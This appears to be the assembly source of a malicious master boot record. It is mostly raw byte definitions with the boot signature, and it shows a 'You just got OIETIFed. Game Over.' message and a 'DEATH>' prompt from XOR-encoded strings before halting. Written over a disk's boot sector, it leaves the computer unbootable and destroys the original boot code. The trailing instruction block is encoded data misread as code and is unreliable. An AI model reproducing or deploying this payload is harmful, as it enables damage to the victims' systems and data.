jmp short start
nop

start: 
db 0FAh
db 0EAh, 6, 7Ch, 2, 31h, 0C0h, 8Eh, 0D8h, 8Eh, 0C0h
db 8Eh, 0D0h, 0BCh, 0, 7Ch, 0C7h, 6, 6Ch, 0, 0C5h, 7Ch
db 0C7h, 6, 6Eh, 3, 0C7h, 6, 70h, 0, 0C0h, 7Ch
db 0C7h, 6, 72h, 3, 0FBh, 0E8h, 4Eh, 0, 0BEh, 0ECh
db 7Ch, 0E8h, 65h, 0, 0BAh, 32h, 0, 0B9h, 8, 0, 0B4h, 0Eh
db 0B0h, 2Eh, 0CDh, 10h, 0E8h, 27h, 0, 0E2h, 0F9h, 0E8h
db 34h, 0, 6, 68h, 0, 0B8h, 7, 0B9h, 21h, 0, 31h, 0FFh
db 0B8h, 0, 0F0h, 0F3h, 0ABh, 7, 0BEh, 0F8h, 7Ch, 0E8h
db 3Bh, 0, 0BEh, 40h, 7Dh, 30h, 0E4h, 5, 0EBh, 0F7h
db 0FAh, 0C7h, 6, 0EAh, 7Ch, 2, 0FBh, 39h, 16h
db 0EAh, 7Ch, 73h, 3, 0F4h, 0EBh, 0F7h, 0C3h, 50h, 6, 51h
db 57h, 30h, 0E4h, 0B0h, 3, 0CDh, 10h, 68h, 0, 0B8h, 7
db 0B9h, 0D0h, 7, 31h, 0FFh, 0B8h, 0, 0Fh, 0F3h, 0ABh
db 5Fh, 59h, 7, 58h, 0C3h, 56h, 50h, 0B4h, 0Eh, 0ACh, 84h
db 0C0h, 74h, 4, 0CDh, 10h, 0EBh, 0F7h, 58h, 5Eh, 0C3h
db 50h, 0B4h, 0Eh, 0B0h, 20h, 0CDh, 10h, 0ACh, 3Ch, 20h
db 74h, 0Ah, 84h, 0C0h, 74h, 2Eh, 34h, 46h, 0CDh, 10h
db 0EBh, 0F1h, 58h, 0C3h, 0FFh, 6, 0EAh, 7Ch, 0CFh, 0BEh
db 24h, 7Dh, 0B4h, 0Eh, 0B0h, 0Dh, 0CDh, 10h, 0B0h, 0Ah
db 0CDh, 10h, 0CDh, 10h, 0ACh, 3Ch, 20h, 74h, 6, 84h, 0C0h
db 74h, 6, 34h, 46h, 0CDh, 10h, 0EBh, 0F1h, 0F4h, 0EBh
db 0FDh, 0F4h, 0EBh, 0FDh, 90h, 2, 50h, 6Ch, 65h
db 61h, 73h, 65h, 20h, 77h, 61h, 69h, 74h, 0
db  59h ; Y
aOuJustGotOieti db 'ou just got OIETIFed. Game Over.',0Dh,0Ah
db 0Ah
db 'DEATH> ',0
db 7Ch, 3, 10h, 3, 14h, 78h, 20h, 21h, 29h, 2
db 27h, 20h, 2Bh, 27h, 2Dh, 23h, 20h, 3Fh, 29h, 33h, 20h
db 25h, 34h, 3Fh, 20h, 4Bh, 4Ch, 8, 3, 10h, 3, 14h, 78h
db 20h, 21h, 29h, 2, 27h, 20h, 35h, 27h, 3Fh
db 20h, 21h, 2, 22h, 24h, 3Fh, 23h, 20h, 4Bh
db 4Ch, 8, 3, 10h, 3, 14h

; ---------------------------------------------------------------------------

and     [bx+di], bp
sub     [bx+si], ch
daa
and     [bp+si], dh
and     bp, [bp+si]
sub     ah, [bx+si]
daa
and     [bp+si], ch
das
and     sp, [bx+si]
daa
sub     [bp+si], ah
and     [ds:3433h], ch
xor     ah, [bx+si]
aas
sub     [bp+di], si
and     [bp+di+4Ch], cl

times 510-($-$$) db 0
        ;Begin MBR Signature
db 0x55 ;byte 511 = 0x55
db 0xAA ;byte 512 = 0xAA